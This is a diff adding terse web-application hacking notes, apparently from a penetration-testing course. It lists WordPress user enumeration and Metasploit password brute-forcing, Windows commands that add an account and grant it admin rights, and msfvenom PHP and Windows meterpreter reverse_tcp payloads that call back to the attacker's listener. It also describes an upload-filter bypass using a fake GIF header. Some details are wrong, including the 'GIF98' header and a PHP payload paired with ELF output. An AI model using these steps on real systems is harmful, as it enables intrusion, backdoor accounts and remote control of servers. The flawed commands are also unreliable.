@@ -1,0 +1,86 @@
+* Exploiting parameter tampering and XSS vulns:
+    - Check for user inputs in the web application.
+    - Try to inject the basic script tags in parameters like username, description box, comment box etc.
+
+* Enumerating Webapp with WPScan and Metasploit:
+    - Enumerating wordpress users using wpscan:
+        # wpscan --url <url> --enumerate u 
+        Above command will list out the available users if its founds any along with the extra details of the application.
+    - Bruteforcing user creds on wordpress:
+        - Open metasploit.
+        - To bruteforce password we will be using auxiliary module named wordpress_login_enum.
+        - Type below command after opening msfconsole:
+            # use auxiliary/scanner/http/wordpress_login_enum
+            We need to set below parameters to get this working:
+                1. PASS_FILE
+                2. RHOSTS
+                3. report
+                4. TARGETURI
+                5. USERNAME (Attack with one username at a time)
+        - Run the attack (# run)
+
+* Exploiting RCE Vuln to compromise a target web server:
+    - Few important RCE commands to get the basic information of the windows server
+        # whoami
+        # tasklist
+        # dir C:\ or any other directory who want to list out contents
+        # net user or # net user Test /Add (to add an account)
+        # net localgroup Administrator <username> /Add (To grant admin priv to the new user)
+
+* Auditing Web application Framework using Vega:
+    - Open Vega and in the target enter the url where website is hosted.
+    - In the select modules section , select both Injection and Response processing modules.
+    - In Authentication and Parameters options keep the default settings and click on next.
+    - Follow Redirect ? -> "Yes"
+    - Vega will list out all the vulns in the web application.
+
+* Website scanning using Acunetix scanner:
+    - Open Acunetix scanner and click on "Add Target". Type the url of the target website and click on "add target".
+    - Set Business criticality "High".
+    - Choose scanning -> Full
+    - Report -> OWASP Top 10
+    - Click on Create scan. Acunetix will scan the website and display issue with threat level.
+
+* Exploiting File upload vulns:
+    - Create a php raw payload using below msfvenom command:
+        # msfvenom  -p php/meterpreter/reverse_tcp lhost=<own ip> lport=<own listening port> -f raw
+        Hit enter.
+    - Copy the raw payload seen in the terminal and paste in in a text file and save a file with <any name>.php
+    - Use this file for upload php payloads
+    - To use msfconsole as a handler, perform below commands:
+        # use multi/handler
+        # set payload php/meterpreter/reverse_tcp
+        # set lhost <own ip>
+        # set lport <own listener port>
+        # run
+    - You can use "GIF98" at the starting of teh content to change the header of the file as type "GIF", to bypass the restrictions.
+
+* Identify vulnerable wordpress plugins:
+    - Open terminal and run below command:
+        # wpscan -u <url> --enumerate vp
+
+* Create a trojan file.
+    # msfvenom -p windows/meterpreter/reverse_tcp -f exe > /output/file/path
+    # msfvenom  -p php/meterpreter/reverse_tcp lhost=<own ip> lport=<own listening port> -f elf > /output/file/path
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
